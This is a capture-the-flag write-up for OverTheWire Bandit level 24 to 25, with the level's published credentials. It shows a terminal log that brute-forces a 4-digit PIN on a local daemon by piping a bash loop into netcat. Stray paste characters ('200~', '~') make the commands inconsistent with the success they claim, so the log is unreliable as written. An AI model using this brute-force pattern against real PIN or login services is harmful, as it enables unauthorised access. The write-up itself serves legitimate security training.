# Level 24 -> 25

## Objetivo
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Datos de acceso
sh bandit24@**bandit.labs.overthewire.org** -p2220

user: bandit24
pass: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

## Solucion 
```console
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
Timeout. Exiting.
^C
bandit24@bandit:~$ echo {0000..0005}
0000 0001 0002 0003 0004 0005
bandit24@bandit:~$ for i int(0000..0005); do echo 200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ $i; done
-bash: syntax error near unexpected token `int'
bandit24@bandit:~$ for i in (0000..0005); do echo 200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ $i; done
-bash: syntax error near unexpected token `('
bandit24@bandit:~$ for i in {0000..0005}; do echo 200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ $i; done
200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ 0000
200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ 0001
200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ 0002
200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ 0003
200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ 0004
200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ 0005
bandit24@bandit:~$ for i in {0000..0005}; do echo 200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ $i; done | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password. Try again.
Wrong! Please enter the correct current password. Try again.
Wrong! Please enter the correct current password. Try again.
Wrong! Please enter the correct current password. Try again.
Wrong! Please enter the correct current password. Try again.
Wrong! Please enter the correct current password. Try again.
^C
bandit24@bandit:~$ for i in {0000..0005}; do echo 200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ $i; done | nc localhost 30002 | grep -v Wrong!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Timeout. Exiting.
bandit24@bandit:~$ for i in {0000..9999}; do echo 200~VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar~ $i; done | nc localhost 30002 | grep -v Wrong!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.

p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
```